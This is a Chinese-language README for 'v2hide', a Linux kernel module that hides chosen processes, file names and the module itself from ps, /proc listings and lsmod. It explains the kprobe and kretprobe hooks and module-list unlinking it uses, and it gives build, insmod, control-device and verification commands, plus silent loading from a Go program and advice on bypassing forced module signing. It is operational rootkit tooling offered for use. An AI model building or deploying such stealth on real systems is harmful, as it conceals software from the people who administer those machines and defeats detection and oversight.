# v2hide — Linux 进程隐藏模块

把指定 pid（或 comm 匹配的进程）从 /proc 目录项和 /proc/<pid> 直接访问中摘掉。
ps / top / htop / ls /proc / procps / busybox ps 全部走 getdents，因此都看不到。

## 原理

| 隐藏面 | 手法 |
| --- | --- |
| /proc 目录列举 | kprobe 挂 iterate_dir，对 procfs/sysfs 把 dir_context->actor 换成过滤器，返回 0 即丢弃该目录项 |
| /proc/<pid> 直接访问 | kretprobe 挂 proc_pid_lookup，命中隐藏 pid 时把返回值置 NULL，VFS 报 ENOENT |
| lsmod / /proc/modules | list_del(THIS_MODULE->list) + kobject_del 摘掉自身 |
| 隐藏进程自身视角 | 默认放行（hide_from_self=0），保证隐藏进程内部 /proc/self/* 仍可用 |

为什么不用 DKOM 摘 task_struct 链表：4.x 之后 procfs 换成 idr 树，摘 pid_links 不再影响 /proc 目录，
现代内核上真正有效的是"过滤 getdents 输出"这一层。

## 编译

~~~
sudo apt install linux-headers-$(uname -r) build-essential    # 或 dnf install kernel-devel
make
sudo install -m 600 v2hide.ko /etc/v2nb/v2hide.ko
~~~

## 使用

~~~
# 手工加载：隐藏 v2nb 进程 + 模块自身
sudo insmod v2hide.ko target_pid=$(pgrep -f 'v2nb server') hide_module=1 hide_direct=1

# 控制节点 /dev/v2hide（文本协议）
echo "add 4321"    > /dev/v2hide     # 追加隐藏 pid
echo "del 4321"    > /dev/v2hide
echo "name mysock" > /dev/v2hide     # 隐藏同名文件/目录项
echo "clear"       > /dev/v2hide
echo "show"        > /dev/v2hide     # 恢复模块可见性（rmmod 之前必须做）
sudo rmmod v2hide
~~~

程序内自动加载：conf.Stealth{Enable:true, Kernel:true, KernelModule:"/etc/v2nb/v2hide.ko"}，
Go 侧用 finit_module(2) 直接喂内核，不依赖 insmod 可执行文件是否存在。

## 验证

~~~
ps aux | grep v2nb                                  # 应为空（自身视角除外）
ls /proc | grep -x "$(pgrep -f 'v2nb server')"      # 应为空
lsmod | grep v2hide                                 # hide_module=1 时为空
cat /proc/$(pgrep -f 'v2nb server')/status          # hide_direct=1 时报 No such file or directory
~~~

## 注意

- 需要 root / CAP_SYS_MODULE；普通容器不满足（要 --privileged 且宿主允许加载模块）。
- 内核开了 CONFIG_MODULE_SIG_FORCE 时必须给模块签名，或关闭强制签名。
- hide_module=1 会让 rmmod 找不到模块，卸载前先 echo show > /dev/<dev_name>。
- 只在自己拥有或被授权的主机上使用。
